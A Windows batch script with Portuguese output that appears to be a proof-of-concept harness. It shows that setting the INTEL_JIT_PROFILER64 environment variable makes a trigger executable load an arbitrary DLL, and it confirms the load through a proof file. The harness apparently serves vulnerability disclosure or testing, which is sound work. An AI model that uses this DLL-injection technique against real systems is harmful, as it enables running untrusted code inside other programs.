@echo off
setlocal

set SCRIPT_DIR=%~dp0
set BIN_DIR=%SCRIPT_DIR%bin

if not exist "%BIN_DIR%\itt_jit_trigger.exe" (
    echo [ERRO] Executavel nao encontrado em %BIN_DIR%\itt_jit_trigger.exe
    echo Execute primeiro o script build_sample.bat para compilar os binarios.
    exit /b 1
)

cd /d "%BIN_DIR%"

echo =======================================================
echo TESTE 1: Baseline (sem variavel de ambiente)
echo =======================================================
del /f /q POC_DLL_INJECTION_PROOF.txt 2>nul
set INTEL_JIT_PROFILER64=
itt_jit_trigger.exe
if exist POC_DLL_INJECTION_PROOF.txt (
    echo [ALERTA] POC_DLL_INJECTION_PROOF.txt encontrado inesperadamente!
) else (
    echo [OK] Nenhuma DLL externa foi carregada. Retornos foram 0 conforme esperado.
)

echo.
echo =======================================================
echo TESTE 2: Com variavel de ambiente (apontando para poc_dll.dll)
echo =======================================================
del /f /q POC_DLL_INJECTION_PROOF.txt 2>nul
set INTEL_JIT_PROFILER64=%BIN_DIR%\poc_dll.dll
echo Definindo INTEL_JIT_PROFILER64=%INTEL_JIT_PROFILER64%
itt_jit_trigger.exe

echo.
echo =======================================================
echo VERIFICACAO DA PROVA:
echo =======================================================
if exist POC_DLL_INJECTION_PROOF.txt (
    echo [CONFIRMADO] A DLL externa foi carregada com sucesso pelo executavel!
    echo Conteudo do arquivo de prova:
    type POC_DLL_INJECTION_PROOF.txt
) else (
    echo [BLOQUEADO] O arquivo de prova NAO foi criado. Carregamento bloqueado.
)
